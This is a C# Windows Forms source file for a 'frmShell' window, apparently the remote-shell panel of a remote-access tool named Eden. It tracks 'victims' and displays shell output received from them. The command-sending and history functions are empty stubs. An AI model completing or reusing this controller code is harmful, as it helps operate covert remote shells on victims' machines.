using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmShell : Form
    {
        private Victim m_victim;
        public string m_szVictimID;

        private enum HistoryCmd
        {
            Previous,
            Next,
        }

        public frmShell(Victim victim)
        {
            InitializeComponent();

            m_victim = victim;
        }

        private void fnReceived(Client m_clnt, string szVictimID, string[] aszMsg)
        {
            try
            {
                if (!string.Equals(szVictimID, m_szVictimID))
                    return;

                if (aszMsg[0] == "shell")
                {
                    Invoke(new Action(() =>
                    {
                        richTextBox1.AppendText(aszMsg[1]);
                    }));
                }
            }
            catch (Exception ex)
            {

            }
        }

        private void fnInitCmd()
        {
            richTextBox1.Clear();

        }

        private void fnSendCmdCommand(string szCmd)
        {

        }

        private void fnHistoryCmd(HistoryCmd history)
        {
            switch (history)
            {
                case HistoryCmd.Previous:

                    break;
                case HistoryCmd.Next:

                    break;
            }
        }

        void fnSetup()
        {
            //Controls
            StartPosition = FormStartPosition.CenterScreen;

            textBox1.Text = "/bin/bash";
            textBox2.Text = "netstat -ano | grep \"ESTABLISHED\"";

            m_victim.m_clnt.ServerMessageReceived += fnReceived;

            fnInitCmd();
        }

        private void frmShell_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                fnInitCmd();
            }
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            switch (e.KeyCode)
            {
                case Keys.Enter:
                    fnSendCmdCommand(textBox2.Text);
                    break;
                case Keys.Up:
                    fnHistoryCmd(HistoryCmd.Previous);
                    break;
                case Keys.Down:
                    fnHistoryCmd(HistoryCmd.Next);
                    break;
            }
        }
    }
}
